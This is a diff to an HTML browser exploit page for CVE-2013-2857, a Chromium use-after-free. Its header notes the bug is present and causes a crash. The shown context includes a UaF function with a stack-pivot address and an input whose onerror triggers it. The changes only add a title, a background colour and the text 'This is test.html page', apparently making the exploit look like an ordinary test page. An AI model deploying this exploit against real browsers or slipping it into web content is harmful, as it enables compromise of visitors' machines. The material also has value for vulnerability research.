@@ -4,8 +4,10 @@ CVE-2013-2857
 Use after free https://bugs.chromium.org/p/chromium/issues/detail?id=240124
 Result: Bug is present, crash
 -->
+          
 <html>
 <head>
+<title>HTML Page</title>
 <script>
 function UaF(a){
     var pivotAdress             = 17489356;
@@ -93,7 +95,8 @@ function sleep(ms) {
 </script>
 
 </head>
-<body>
+<body bgcolor="#FFFFFF">
+    This is test.html page
 <input id="x" type="hidden" onerror="UaF(this);" src=""/>
 <video onloadstart="sleep(500)">
   <source src="indexiine.mp4" type="video/mp4">
